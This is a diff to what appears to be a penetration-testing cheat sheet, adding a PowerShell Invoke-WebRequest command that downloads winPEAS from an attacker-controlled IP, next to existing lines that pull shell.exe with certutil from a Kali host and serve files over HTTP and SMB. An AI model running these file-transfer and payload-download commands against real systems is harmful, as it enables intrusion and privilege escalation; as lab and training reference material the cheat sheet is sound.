@@ -1793,6 +1793,13 @@ copy \\<your kali IP>\share\whoami.exe
 python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 ````
+````
+Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
+````
+#### Errors
+````
+Access is denied. In this case try Invoke-WebRequest for powershell
+````
 ### SMB Server Bi-directional
 ````
 impacket-smbserver -smb2support Share .
